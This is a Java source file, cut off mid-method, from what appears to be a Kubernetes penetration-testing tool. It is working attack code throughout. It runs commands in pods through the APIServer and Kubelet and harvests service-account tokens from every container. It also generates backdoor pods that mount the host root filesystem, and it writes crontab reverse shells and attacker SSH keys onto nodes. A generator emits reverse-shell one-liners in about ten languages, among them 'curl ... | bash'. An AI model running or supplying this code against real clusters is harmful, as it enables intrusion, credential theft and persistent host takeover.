package com.k8spen.tool.controller;

import com.google.gson.JsonArray;
import com.google.gson.JsonObject;
import com.google.gson.JsonParser;
import com.k8spen.tool.helper.PodJsonParser;
import com.k8spen.tool.helper.PodTableItem;
import com.k8spen.tool.utils.K8sHttpUtil;
import com.k8spen.tool.utils.K8sJsonRenderer;
import com.k8spen.tool.utils.KubectlUtil;
import javafx.application.Platform;
import javafx.collections.FXCollections;
import javafx.concurrent.Task;
import javafx.scene.control.*;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.util.ArrayList;
import java.util.Base64;
import java.util.List;

/**
 * 2. Execution - APIServer exec / Kubelet exec / Backdoor Pod / SA Exploitation / RBAC / Reverse Shell
 */
public class ExecHandler {

    private static final Logger LOGGER = LoggerFactory.getLogger(ExecHandler.class);

    private final ControllerContext ctx;

    // APIServer exec
    private final TextField apiExecNs, apiExecPod, apiExecContainer, apiExecCmd;
    private final TextField apiExecUsername;
    private final PasswordField apiExecPassword;
    private final TextArea apiExecOutput;
    private final TableView<PodTableItem> apiPodTable;
    private final TableColumn<PodTableItem,String> colNs, colName, colStatus, colNode, colIP, colContainers;

    // Kubelet exec
    private final TextField execNamespace, execPodName, execContainerName, execCommand;
    private final TextArea execOutput;
    private final TableView<PodTableItem> kubeletPodTable;
    private final TableColumn<PodTableItem,String> kColNs, kColName, kColStatus, kColNode, kColIP, kColContainers;

    // Backdoor Pod
    private final TextField backdoorImage, backdoorMountPath, backdoorNodeName;
    private final TextField backdoorLhost, backdoorLport, backdoorPodName;
    private final TextArea sshPubKeyInput, backdoorYamlOutput;

    // SA Exploitation
    private final TextArea saUtilCmds;
    private final TextField saTokenInput;
    private final TextArea saCheckOutput;

    // RBAC
    private final TextArea rbacCheckCmds, rbacOutput;

    // Reverse Shell
    private final TextField revShellLhost, revShellLport;
    private final ComboBox<String> revShellType;
    private final TextArea revShellOutput;

    private final String defaultSshPubKey, defaultSshPrivKey;

    public ExecHandler(ControllerContext ctx,
                       TextField apiExecNs, TextField apiExecPod, TextField apiExecContainer,
                       TextField apiExecCmd, TextField apiExecUsername, PasswordField apiExecPassword,
                       TextArea apiExecOutput,
                       TableView<PodTableItem> apiPodTable,
                       TableColumn<PodTableItem,String> colNs, TableColumn<PodTableItem,String> colName,
                       TableColumn<PodTableItem,String> colStatus, TableColumn<PodTableItem,String> colNode,
                       TableColumn<PodTableItem,String> colIP, TableColumn<PodTableItem,String> colContainers,
                       TextField execNamespace, TextField execPodName, TextField execContainerName,
                       TextField execCommand, TextArea execOutput,
                       TableView<PodTableItem> kubeletPodTable,
                       TableColumn<PodTableItem,String> kColNs, TableColumn<PodTableItem,String> kColName,
                       TableColumn<PodTableItem,String> kColStatus, TableColumn<PodTableItem,String> kColNode,
                       TableColumn<PodTableItem,String> kColIP, TableColumn<PodTableItem,String> kColContainers,
                       TextField backdoorImage, TextField backdoorMountPath, TextField backdoorNodeName,
                       TextField backdoorLhost, TextField backdoorLport, TextField backdoorPodName,
                       TextArea sshPubKeyInput, TextArea backdoorYamlOutput,
                       TextArea saUtilCmds, TextField saTokenInput, TextArea saCheckOutput,
                       TextArea rbacCheckCmds, TextArea rbacOutput,
                       TextField revShellLhost, TextField revShellLport,
                       ComboBox<String> revShellType, TextArea revShellOutput,
                       String defaultSshPubKey, String defaultSshPrivKey) {
        this.ctx = ctx;
        this.apiExecNs = apiExecNs; this.apiExecPod = apiExecPod;
        this.apiExecContainer = apiExecContainer; this.apiExecCmd = apiExecCmd;
        this.apiExecUsername = apiExecUsername; this.apiExecPassword = apiExecPassword;
        this.apiExecOutput = apiExecOutput;
        this.apiPodTable = apiPodTable;
        this.colNs = colNs; this.colName = colName; this.colStatus = colStatus;
        this.colNode = colNode; this.colIP = colIP; this.colContainers = colContainers;
        this.execNamespace = execNamespace; this.execPodName = execPodName;
        this.execContainerName = execContainerName; this.execCommand = execCommand;
        this.execOutput = execOutput;
        this.kubeletPodTable = kubeletPodTable;
        this.kColNs = kColNs; this.kColName = kColName; this.kColStatus = kColStatus;
        this.kColNode = kColNode; this.kColIP = kColIP; this.kColContainers = kColContainers;
        this.backdoorImage = backdoorImage; this.backdoorMountPath = backdoorMountPath;
        this.backdoorNodeName = backdoorNodeName; this.backdoorLhost = backdoorLhost;
        this.backdoorLport = backdoorLport; this.backdoorPodName = backdoorPodName;
        this.sshPubKeyInput = sshPubKeyInput; this.backdoorYamlOutput = backdoorYamlOutput;
        this.saUtilCmds = saUtilCmds; this.saTokenInput = saTokenInput; this.saCheckOutput = saCheckOutput;
        this.rbacCheckCmds = rbacCheckCmds; this.rbacOutput = rbacOutput;
        this.revShellLhost = revShellLhost; this.revShellLport = revShellLport;
        this.revShellType = revShellType; this.revShellOutput = revShellOutput;
        this.defaultSshPubKey = defaultSshPubKey; this.defaultSshPrivKey = defaultSshPrivKey;
    }

    public void init() {
        initSaUtilCmds();
        initRbacCheckCmds();
        initPodClickAutoFill();
    }

    // ================ APIServer exec ================

    public void apiListPods() {
        String ns = apiExecNs.getText().trim();
        String url;
        if (ns.isEmpty() || ns.equals("--all")) {
            url = ctx.buildApiServerUrl("/api/v1/pods");
            ctx.log("[*] GET " + url + " (all namespaces)");
        } else {
            url = ctx.buildApiServerUrl("/api/v1/namespaces/" + ns + "/pods");
            ctx.log("[*] GET " + url);
        }
        if (url == null) { apiExecOutput.setText("[-] Please enter the target address"); return; }
        ctx.setStatus("Fetching Pod list...");
        Task<String> task = new Task<>() {
            @Override protected String call() throws Exception {
                return K8sHttpUtil.sendRequest(url, "GET", ctx.getToken(), ctx.getTimeout(), ctx.isSkipTls());
            }
        };
        task.setOnSucceeded(e -> {
            List<PodTableItem> pods = PodJsonParser.parse(task.getValue());
            apiPodTable.setItems(FXCollections.observableArrayList(pods));
            apiExecOutput.setText("[+] Listed " + pods.size() + " Pod(s)");
            ctx.setStatus("Pod list fetched: " + pods.size());
            ctx.log("[+] Pod list fetched successfully: " + pods.size());
        });
        task.setOnFailed(e -> { apiExecOutput.setText("[-] Failed: " + (task.getException() != null ? task.getException().getMessage() : "")); ctx.log("[-] Pod list fetch failed"); });
        ControllerContext.execute(task);
    }

    public void apiExecInPod() {
        String ns = apiExecNs.getText().trim();
        String pod = apiExecPod.getText().trim();
        String container = apiExecContainer.getText().trim();
        String cmd = apiExecCmd.getText().trim();
        if (pod.isEmpty() || cmd.isEmpty()) { apiExecOutput.setText("[-] Please enter Pod name and command"); return; }
        if (ns.isEmpty()) ns = "default";
        String kubectlCmd = "kubectl exec " + pod + " -n " + ns + (container.isEmpty() ? "" : " -c " + container) + " -- " + cmd;
        ctx.log("[*] APIServer exec (kubectl): " + ns + "/" + pod + " -> " + cmd);
        ctx.setStatus("Executing command...");
        String fNs = ns; String host = ctx.getHost(); String token = ctx.getToken();
        Task<String> task = new Task<>() {
            @Override protected String call() throws Exception {
                String kcPath = generateApiServerKubeconfig(host, token);
                List<String> args = new ArrayList<>();
                args.add("exec"); args.add(pod); args.add("-n"); args.add(fNs);
                if (!container.isEmpty()) { args.add("-c"); args.add(container); }
                args.add("--");
                for (String part : cmd.split("\\s+")) { if (!part.isEmpty()) args.add(part); }
                return KubectlUtil.execWithKubeconfig(kcPath, ctx.getTimeout(), args.toArray(new String[0]));
            }
        };
        task.setOnSucceeded(e -> {
            String result = task.getValue();
            apiExecOutput.setText("# " + kubectlCmd + "\n\n" + result);
            if (result.startsWith("[Exit code:")) ctx.log("[-] exec failed: " + result.substring(0, Math.min(100, result.length())));
            else ctx.log("[+] exec executed successfully");
            ctx.setStatus("Command execution completed");
        });
        task.setOnFailed(e -> { apiExecOutput.setText("[-] Execution failed: " + (task.getException() != null ? task.getException().getMessage() : "")); ctx.log("[-] exec execution failed"); });
        ControllerContext.execute(task);
    }

    public void apiEnumSATokens() {
        ctx.log("[*] Enumerating SA Tokens via APIServer HTTP (Secrets API)...");
        ctx.setStatus("Enumerating SA Tokens...");
        apiExecOutput.setText("[*] Enumerating SA Tokens via APIServer HTTP...\n");
        String secretsUrl = ctx.buildApiServerUrl("/api/v1/secrets?fieldSelector=type=kubernetes.io/service-account-token");
        if (secretsUrl == null) { apiExecOutput.setText("[-] Please enter the target address"); return; }
        Task<String> task = new Task<>() {
            @Override protected String call() throws Exception { return K8sHttpUtil.sendRequest(secretsUrl, "GET", ctx.getToken(), ctx.getTimeout(), ctx.isSkipTls()); }
        };
        task.setOnSucceeded(e -> {
            String resp = task.getValue();
            try {
                JsonObject root = JsonParser.parseString(resp).getAsJsonObject();
                JsonArray items = root.getAsJsonArray("items");
                if (items == null || items.size() == 0) { apiExecOutput.setText("[-] No SA Token Secret found"); return; }
                StringBuilder sb = new StringBuilder(String.format("[*] Found %d SA Token Secret(s)\n\n", items.size()));
                for (int i = 0; i < items.size(); i++) {
                    JsonObject item = items.get(i).getAsJsonObject();
                    JsonObject meta = item.getAsJsonObject("metadata");
                    String name = meta.has("name") ? meta.get("name").getAsString() : "?";
                    String ns2 = meta.has("namespace") ? meta.get("namespace").getAsString() : "?";
                    String saName = "";
                    if (meta.has("annotations")) { JsonObject a = meta.getAsJsonObject("annotations"); if (a.has("kubernetes.io/service-account.name")) saName = a.get("kubernetes.io/service-account.name").getAsString(); }
                    String tokenB64 = item.has("data") && item.getAsJsonObject("data").has("token") ? item.getAsJsonObject("data").get("token").getAsString() : "";
                    String decoded = tokenB64;
                    try { decoded = new String(Base64.getDecoder().decode(tokenB64)); } catch (Exception ex) { LOGGER.debug("Base64 decode failed", ex); }
                    sb.append("=".repeat(70)).append("\n");
                    sb.append(String.format("✅ [%d] %s/%s (SA: %s)\n", i + 1, ns2, name, saName));
                    sb.append("Token: ").append(decoded.length() > 200 ? decoded.substring(0, 200) + "..." : decoded).append("\n\n");
                }
                apiExecOutput.setText(sb.toString());
                ctx.log("[+] SA Token enumeration completed: found " + items.size());
            } catch (Exception ex) {
                LOGGER.warn("Failed to parse SA token secrets response", ex);
                apiExecOutput.setText(K8sJsonRenderer.render(resp));
            }
            ctx.setStatus("SA Token enumeration completed");
        });
        task.setOnFailed(e -> { apiExecOutput.setText("[-] Enumeration failed: " + (task.getException() != null ? task.getException().getMessage() : "")); });
        ControllerContext.execute(task);
    }

    // ================ Kubelet exec ================

    public void listPodsForExec() {
        String host = ctx.getHost(); if (host == null) return;
        String url = "https://" + host + ":10250/pods";
        ctx.log("[*] GET " + url + " (Kubelet local node Pods)");
        ctx.setStatus("Kubelet fetching Pod list...");
        Task<String> task = new Task<>() {
            @Override protected String call() throws Exception { return K8sHttpUtil.sendRequest(url, "GET", ctx.getToken(), ctx.getTimeout(), ctx.isSkipTls()); }
        };
        task.setOnSucceeded(e -> {
            List<PodTableItem> pods = PodJsonParser.parse(task.getValue());
            kubeletPodTable.setItems(FXCollections.observableArrayList(pods));
            execOutput.setText("[+] Kubelet listed " + pods.size() + " Pod(s)\n# curl -k " + url);
            ctx.setStatus("Kubelet Pod list: " + pods.size());
        });
        task.setOnFailed(e -> { execOutput.setText("[-] Failed: " + (task.getException() != null ? task.getException().getMessage() : "")); });
        ControllerContext.execute(task);
    }

    public void execInPod() {
        String host = ctx.getHost(); if (host == null) return;
        String ns = execNamespace.getText().trim(); String pod = execPodName.getText().trim();
        String container = execContainerName.getText().trim(); String cmd = execCommand.getText().trim();
        if (pod.isEmpty() || cmd.isEmpty()) { execOutput.setText("[-] Please enter Pod name and command"); return; }
        String kubeletUrl = "https://" + host + ":10250/run/" + ns + "/" + pod + "/" + container;
        ctx.log("[*] Kubelet exec: " + ns + "/" + pod + "/" + container + " -> " + cmd);
        execOutput.setText("# curl -k -X POST \"" + kubeletUrl + "\" -d \"cmd=" + cmd + "\"\n\nExecuting...");
        ctx.asyncPost(kubeletUrl, "cmd=" + cmd, "application/x-www-form-urlencoded", execOutput);
    }

    public void execRevShellInPod() {
        String host = ctx.getHost(); if (host == null) return;
        String ns = execNamespace.getText().trim(); String pod = execPodName.getText().trim();
        String container = execContainerName.getText().trim();
        if (pod.isEmpty()) { execOutput.setText("[-] Please enter Pod name"); return; }
        String hint = "# Execute reverse shell in Pod:\nkubectl exec -it " + pod + " -n " + ns + (container.isEmpty() ? "" : " -c " + container)
                + " -- bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'\n\n# Or use sh:\nkubectl exec -it " + pod + " -n " + ns + (container.isEmpty() ? "" : " -c " + container)
                + " -- sh -c 'sh -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'\n\n# Generate payload in the Reverse Shell tab first, then replace <LHOST> and <LPORT>";
        execOutput.setText(hint + "\n\n[*] Please generate the payload in the 'Reverse Shell' tab first, then copy it into the command to execute");
    }

    public void enumSATokensViaExec() {
        String host = ctx.getHost(); if (host == null) return;
        ctx.log("[*] Enumerating SA Tokens for all Pods via Kubelet...");
        ctx.setStatus("Enumerating SA Tokens...");
        execOutput.setText("[*] Enumerating SA Tokens for all Pods via Kubelet API...\n");
        Task<String> task = new Task<>() {
            @Override protected String call() throws Exception {
                StringBuilder sb = new StringBuilder();
                String podsUrl = "https://" + host + ":10250/pods/";
                String podsJson = K8sHttpUtil.sendRequest(podsUrl, "GET", null, ctx.getTimeout(), ctx.isSkipTls());
                if (podsJson.contains("[HTTP 4") || podsJson.contains("[HTTP 5") || !podsJson.contains("items")) {
                    sb.append("[-] Unable to fetch Pod list via Kubelet\n").append(podsJson.substring(0, Math.min(500, podsJson.length())));
                    return sb.toString();
                }
                String json = podsJson.substring(podsJson.indexOf('\n') + 1).trim();
                JsonObject root = JsonParser.parseString(json).getAsJsonObject();
                JsonArray items = root.has("items") ? root.getAsJsonArray("items") : new JsonArray();
                int total = 0, found = 0;
                for (int i = 0; i < items.size(); i++) {
                    JsonObject pod = items.get(i).getAsJsonObject();
                    JsonObject meta = pod.getAsJsonObject("metadata");
                    String ns = meta.has("namespace") ? meta.get("namespace").getAsString() : "default";
                    String podName = meta.has("name") ? meta.get("name").getAsString() : "";
                    JsonObject spec = pod.has("spec") ? pod.getAsJsonObject("spec") : new JsonObject();
                    JsonArray containers = spec.has("containers") ? spec.getAsJsonArray("containers") : new JsonArray();
                    for (int c = 0; c < containers.size(); c++) {
                        String containerName = containers.get(c).getAsJsonObject().get("name").getAsString();
                        total++;
                        updateMessage("Checking: " + ns + "/" + podName + "/" + containerName + " (" + total + "/" + items.size() + ")");
                        try {
                            String execUrl = "https://" + host + ":10250/run/" + ns + "/" + podName + "/" + containerName;
                            String result = K8sHttpUtil.sendPost(execUrl, "cmd=cat /var/run/secrets/kubernetes.io/serviceaccount/token", "application/x-www-form-urlencoded", null, 5, ctx.isSkipTls());
                            if (result != null && !result.contains("[HTTP 4") && !result.contains("[HTTP 5")) {
                                String tokenVal = result.contains("\n") ? result.substring(result.indexOf('\n') + 1).trim() : result.trim();
                                if (!tokenVal.isEmpty() && !tokenVal.contains("No such file") && !tokenVal.contains("not found") && tokenVal.length() > 20) {
                                    found++;
                                    sb.append("=".repeat(70)).append("\n");
                                    sb.append(String.format("✅ [%d] %s/%s (container: %s)\n", found, ns, podName, containerName));
                                    sb.append("Token: ").append(tokenVal).append("\n\n");
                                }
                            }
                        } catch (Exception e) {
                            LOGGER.debug("Token extraction failed for {}/{}: {}", ns, podName, e.getMessage());
                        }
                    }
                }
                sb.insert(0, String.format("[*] Scan completed: checked %d container(s), found %d SA Token(s)\n\n", total, found));
                if (found == 0) { sb.append("[-] No readable SA Token found\nHints:\n  1. Pod may not have SA Token mounted\n  2. Container may not have cat command\n  3. Kubelet API may require authentication\n"); }
                return sb.toString();
            }
        };
        task.messageProperty().addListener((obs, o, n) -> Platform.runLater(() -> ctx.setStatus(n)));
        task.setOnSucceeded(e -> { execOutput.setText(task.getValue()); ctx.setStatus("SA Token enumeration completed"); ctx.log("[+] SA Token enumeration completed"); });
        task.setOnFailed(e -> { execOutput.setText("[-] Enumeration failed: " + (task.getException() != null ? task.getException().getMessage() : "")); });
        ControllerContext.execute(task);
    }

    // ================ Backdoor Pod ================

    public void generateBackdoorYaml() {
        String image = backdoorImage.getText().trim(); String mountPath = backdoorMountPath.getText().trim();
        String nodeName = backdoorNodeName.getText().trim(); String lhost = backdoorLhost.getText().trim();
        String lport = backdoorLport.getText().trim(); String podName = backdoorPodName.getText().trim();
        if (image.isEmpty()) image = "ubuntu:latest"; if (mountPath.isEmpty()) mountPath = "/mnt"; if (podName.isEmpty()) podName = "backdoor-pod";
        StringBuilder yaml = new StringBuilder();
        yaml.append("apiVersion: v1\nkind: Pod\nmetadata:\n  name: ").append(podName).append("\n  labels:\n    app: ").append(podName).append("\nspec:\n");
        if (!nodeName.isEmpty()) yaml.append("  nodeName: ").append(nodeName).append("\n");
        yaml.append("  restartPolicy: Always\n  containers:\n  - name: ").append(podName).append("\n    image: ").append(image).append("\n    imagePullPolicy: IfNotPresent\n");
        if (!lhost.isEmpty() && !lport.isEmpty()) yaml.append("    command: [\"/bin/bash\"]\n    args: [\"-c\", \"bash -i >& /dev/tcp/").append(lhost).append("/").append(lport).append(" 0>&1\"]\n");
        else yaml.append("    command: [\"sleep\"]\n    args: [\"infinity\"]\n");
        yaml.append("    volumeMounts:\n    - name: host-root\n      mountPath: ").append(mountPath).append("\n  volumes:\n  - name: host-root\n    hostPath:\n      path: /\n      type: Directory\n");
        backdoorYamlOutput.setText(yaml.toString());
        ctx.log("[+] Backdoor Pod YAML generated");
    }

    public void copyBackdoorYaml() {
        String yaml = backdoorYamlOutput.getText();
        if (yaml == null || yaml.isEmpty()) { generateBackdoorYaml(); yaml = backdoorYamlOutput.getText(); }
        ctx.copyToClipboard(yaml);
    }

    public void generateBackdoorCmd() {
        String podName = backdoorPodName.getText().trim(); if (podName.isEmpty()) podName = "backdoor-pod";
        String lhost = backdoorLhost.getText().trim(); String lport = backdoorLport.getText().trim();
        String mountPath = backdoorMountPath.getText().trim();
        StringBuilder sb = new StringBuilder("# ======== Backdoor Pod Operation Commands ========\n\n# 1. Save YAML to file and create\nkubectl apply -f backdoor.yaml\n\n# 2. Check Pod status\nkubectl get pod ").append(podName).append("\n\n# 3. Enter Pod shell\nkubectl exec -it ").append(podName).append(" -- /bin/bash\n\n# 4. Access host filesystem through mounted directory\n# ls ").append(mountPath).append("/\n\n# 5. Obtain Node shell by writing crontab\n");
        if (!lhost.isEmpty() && !lport.isEmpty()) sb.append("echo '* * * * * root /bin/bash -c \"bash -i >& /dev/tcp/").append(lhost).append("/").append(lport).append(" 0>&1\"' > ").append(mountPath).append("/etc/crontab\n\n");
        sb.append("# 6. Delete backdoor Pod\nkubectl delete pod ").append(podName).append("\n");
        backdoorYamlOutput.setText(sb.toString());
        ctx.log("[+] kubectl commands generated");
    }

    public void generateSshCmd() {
        String mountPath = backdoorMountPath.getText().trim(); String pubKey = sshPubKeyInput.getText().trim();
        String host = ctx.getHost(); if (mountPath.isEmpty()) mountPath = "/mnt";
        String podName = backdoorPodName.getText().trim();
        StringBuilder sb = new StringBuilder("# ======== SSH Private Key Login to Host Workflow ========\n\n# === Step 1: Save private key to attacker machine ===\ncat > ~/.ssh/k8s_backdoor << 'EOF'\n").append(defaultSshPrivKey).append("\nEOF\nchmod 600 ~/.ssh/k8s_backdoor\n\n");
        sb.append("# === Step 2: Append public key to host inside backdoor Pod ===\nkubectl exec -it ").append(podName).append(" -- /bin/bash\n\nmkdir -p ").append(mountPath).append("/root/.ssh\nchmod 700 ").append(mountPath).append("/root/.ssh\n\n");
        sb.append("echo '").append(pubKey.isEmpty() ? "<YOUR_SSH_PUBLIC_KEY>" : pubKey).append("' >> ").append(mountPath).append("/root/.ssh/authorized_keys\nchmod 600 ").append(mountPath).append("/root/.ssh/authorized_keys\n\n");
        sb.append("grep -i 'PermitRootLogin\\|PubkeyAuthentication' ").append(mountPath).append("/etc/ssh/sshd_config\n\nsed -i 's/#PermitRootLogin.*/PermitRootLogin yes/' ").append(mountPath).append("/etc/ssh/sshd_config\nsed -i 's/#PubkeyAuthentication.*/PubkeyAuthentication yes/' ").append(mountPath).append("/etc/ssh/sshd_config\n\n");
        sb.append("echo '* * * * * root systemctl restart sshd' >> ").append(mountPath).append("/etc/crontab\n\n# === Step 3: SSH login to host (execute on attacker machine) ===\n");
        sb.append("ssh -i ~/.ssh/k8s_backdoor root@").append(host != null && !host.isEmpty() ? host : "<TARGET_HOST>").append("\n\n");
        sb.append("# === Alternative: Write to non-root user ===\ncat ").append(mountPath).append("/etc/passwd | grep -v nologin | grep -v false\n");
        backdoorYamlOutput.setText(sb.toString());
        ctx.log("[+] SSH login commands generated");
    }

    // ================ SA Exploitation ================

    public void copySaUtilCmds2() { ctx.copyToClipboard(saUtilCmds.getText()); }

    public void checkSaPermissions() {
        String host = ctx.getHost(); if (host == null) return;
        String token = saTokenInput.getText().trim();
        if (token.isEmpty()) token = ctx.getToken();
        if (token.isEmpty()) { saCheckOutput.setText("[-] Please enter SA Token or fill in Token in target config"); return; }
        String url = "https://" + host + ":6443/apis/authorization.k8s.io/v1/selfsubjectrulesreviews";
        String body = "{\"apiVersion\":\"authorization.k8s.io/v1\",\"kind\":\"SelfSubjectRulesReview\",\"spec\":{\"namespace\":\"default\"}}";
        ctx.setStatus("Checking SA permissions..."); saCheckOutput.setText("Requesting...\n");
        String fToken = token;
        Task<String> task = new Task<>() { @Override protected String call() throws Exception { return K8sHttpUtil.sendPost(url, body, "application/json", fToken, ctx.getTimeout(), ctx.isSkipTls()); } };
        task.setOnSucceeded(e -> { saCheckOutput.setText(task.getValue()); ctx.setStatus("Permission check completed"); ctx.log("[+] SA permission check completed"); });
        task.setOnFailed(e -> { saCheckOutput.setText("[-] Request failed: " + task.getException().getMessage()); });
        ControllerContext.execute(task);
    }

    // ================ RBAC ================

    public void copyRbacCmds() { ctx.copyToClipboard(rbacCheckCmds.getText()); }

    public void checkRbacStatus() {
        String host = ctx.getHost(); if (host == null) return;
        ctx.setStatus("Detecting RBAC..."); rbacOutput.setText("Detecting...\n");
        Task<String> task = new Task<>() {
            @Override protected String call() throws Exception {
                StringBuilder sb = new StringBuilder("# RBAC Detection Results:\n\n");
                try {
                    String result = K8sHttpUtil.sendRequest("https://" + host + ":6443/apis/rbac.authorization.k8s.io/v1", "GET", ctx.getToken(), ctx.getTimeout(), ctx.isSkipTls());
                    if (result.contains("200")) sb.append("[+] RBAC API accessible - RBAC may be enabled\n\n");
                    else sb.append("[-] RBAC API returned non-200 - RBAC may not be enabled\n\n");
                    sb.append(result);
                } catch (Exception e) {
                    LOGGER.warn("Unable to connect to APIServer for RBAC check", e);
                    sb.append("[-] Unable to connect to APIServer: ").append(e.getMessage()).append("\n\n# Please check manually on the master node:\nps -ef | grep apiserver | grep authorization-mode\n");
                }
                return sb.toString();
            }
        };
        task.setOnSucceeded(e -> { rbacOutput.setText(task.getValue()); ctx.setStatus("RBAC detection completed"); });
        task.setOnFailed(e -> rbacOutput.setText("[-] Detection failed: " + task.getException().getMessage()));
        ControllerContext.execute(task);
    }

    // ================ Reverse Shell ================

    public void generateRevShell() {
        String lhost = revShellLhost.getText().trim(); String lport = revShellLport.getText().trim();
        if (lhost.isEmpty() || lport.isEmpty()) { revShellOutput.setText("[-] Please enter LHOST and LPORT"); return; }
        String type = revShellType.getValue();
        String payload;
        switch (type) {
            case "Bash -i": payload = "bash -i >& /dev/tcp/" + lhost + "/" + lport + " 0>&1"; break;
            case "Bash TCP": payload = "bash -c 'sh -i >& /dev/tcp/" + lhost + "/" + lport + " 0>&1'"; break;
            case "Python": payload = "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"" + lhost + "\"," + lport + "));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"; break;
            case "Perl": payload = "perl -e 'use Socket;$i=\"" + lhost + "\";$p=" + lport + ";socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"; break;
            case "NC -e": payload = "nc -e /bin/sh " + lhost + " " + lport; break;
            case "NC mkfifo": payload = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc " + lhost + " " + lport + " >/tmp/f"; break;
            case "PHP": payload = "php -r '$sock=fsockopen(\"" + lhost + "\"," + lport + ");exec(\"/bin/sh -i <&3 >&3 2>&3\");'"; break;
            case "Ruby": payload = "ruby -rsocket -e'f=TCPSocket.open(\"" + lhost + "\"," + lport + ").to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"; break;
            case "Lua": payload = "lua -e \"require('socket');require('os');t=socket.tcp();t:connect('" + lhost + "','" + lport + "');os.execute('/bin/sh -i <&3 >&3 2>&3');\""; break;
            case "Curl": payload = "# First create file shell.sh on VPS:\n# bash -i >& /dev/tcp/" + lhost + "/" + lport + " 0>&1\n\n# Target executes:\ncurl http://" + lhost + "/shell.sh | bash"; break;
            default: payload = ""; break;
        }
        revShellOutput.setText("# Reverse Shell Payload (" + type + ")\n# LHOST: " + lhost + "  LPORT: " + lport + "\n\n" + payload + "\n\n# ========== Listener Command ==========\nnc -lvnp " + lport + "\n");
        ctx.log("[+] Reverse Shell payload generated (" + type + ")");
    }

    public void copyRevShell() { String t = revShellOutput.getText(); if (t != null && !t.isEmpty()) ctx.copyToClipboard(t); }

    // ================ Kubeconfig Generation ================

    public String generatePersistKubeconfig(String host, String token, String username, String password) throws Exception {
        boolean hasToken = token != null && !token.isEmpty();
        boolean hasUser = username != null && !username.isEmpty();
        boolean hasAuth = hasToken || hasUser;
        StringBuilder kc = new StringBuilder("apiVersion: v1\nkind: Config\nclusters:\n- cluster:\n    server: https://").append(host).append(":6443\n    insecure-skip-tls-verify: true\n  name: target\ncontexts:\n- context:\n    cluster: target\n");
        if (hasAuth) kc.append("    user: target-user\n");
        kc.append("  name: target\ncurrent-context: target\n");
        if (hasAuth) { kc.append("users:\n- name: target-user\n  user:\n"); if (hasToken) kc.append("    token: ").append(token).append("\n"); else kc.append("    username: ").append(username).append("\n    password: ").append(password != null ? password : "").append("\n"); }
        else kc.append("users: []\n");
        return KubectlUtil.saveKubeconfig(kc.toString());
    }

    private String generateApiServerKubeconfig(String host, String token) throws Exception {
        String username = apiExecUsername != null ? apiExecUsername.getText().trim() : "";
        String password = apiExecPassword != null ? apiExecPassword.getText().trim() : "";
        return generatePersistKubeconfig(host, token, username, password);
    }

    // ================ Init ================

    private void initSaUtilCmds() {
        saUtilCmds.setText(
                "# ======== ServiceAccount Token Exploitation Workflow ========\n\n"
                + "# 1. Read Token inside Pod\nTOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)\n\n"
                + "# 2. Get APIServer address\nAPISERVER=https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}\n\n"
                + "# 3. Check current Token permissions\ncurl -k -H \"Authorization: Bearer $TOKEN\" \\\n  $APISERVER/apis/authorization.k8s.io/v1/selfsubjectrulesreviews \\\n  -X POST -H \"Content-Type: application/json\" \\\n  -d '{\"apiVersion\":\"authorization.k8s.io/v1\",\"kind\":\"SelfSubjectRulesReview\",\"spec\":{\"namespace\":\"default\"}}'\n\n"
                + "# 4. If high privileges, use kubectl to control cluster\nkubectl --server=$APISERVER --token=$TOKEN \\\n  --insecure-skip-tls-verify=true get nodes\n\n"
                + "# 5. Create backdoor Pod (refer to 'Create Backdoor Pod' tab)\nkubectl --server=$APISERVER --token=$TOKEN \\\n  --insecure-skip-tls-verify=true apply -f backdoor.yaml\n"
        );
    }

    private void initRbacCheckCmds() {
        rbacCheckCmds.setText(
                "# ======== RBAC Permission Detection ========\n\n"
                + "# 1. Check if APIServer has RBAC enabled\nps -ef | grep apiserver | grep authorization-mode\n\n"
                + "# 2. View APIServer Pod configuration\ncat /etc/kubernetes/manifests/kube-apiserver.yaml | grep authorization\n\n"
                + "# If it contains --authorization-mode=RBAC, RBAC is enabled\n# If RBAC is not enabled, any authenticated token can control the APIServer\n\n"
                + "# 3. View current user permissions\nkubectl auth can-i --list\n\n"
                + "# 4. View all ClusterRoleBindings\nkubectl get clusterrolebindings -o wide\n\n"
                + "# 5. Find service accounts bound to cluster-admin\nkubectl get clusterrolebindings -o json | grep -B 10 'cluster-admin'\n\n"
                + "# 6. Exploit clusters without RBAC\nTOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)\nkubectl --server=https://<APISERVER>:6443 --token=$TOKEN \\\n  --insecure-skip-tls-verify=true get pods --all-namespaces\n"
        );
    }

    private void initPodClickAutoFill() {
        colNs.setCellValueFactory(c -> c.getValue().namespaceProperty());
        colName.setCellValueFactory(c -> c.getValue().nameProperty());
        colStatus.setCellValueFactory(c -> c.getValue().statusProperty());
        colNode.setCellValueFactory(c -> c.getValue().nodeProperty());
        colIP.setCellValueFactory(c -> c.getValue().podIPProperty());
        colContainers.setCellValueFactory(c -> c.getValue().containersProperty());
        apiPodTable.getSelectionModel().selectedItemProperty().addListener((obs, oldVal, newVal) -> {
            if (newVal != null) {
                apiExecNs.setText(newVal.getNamespace()); apiExecPod.setText(newVal.getName());
                apiExecContainer.setText(newVal.getFirstContainer());
                ctx.log("[*] Auto-filled: " + newVal.getNamespace() + "/" + newVal.getName() + " (container: " + newVal.getFirstContainer() + ")");
            }
        });
        kColNs.setCellValueFactory(c -> c.getValue().namespaceProperty());
        kColName.setCellValueFactory(c -> c.getValue().nameProperty());
        kColStatus.setCellValueFactory(c -> c.getValue().statusProperty());
        kColNode.setCellValueFactory(c -> c.getValue().nodeProperty());
        kColIP.setCellValueFactory(c -> c.getValue().podIPProperty());
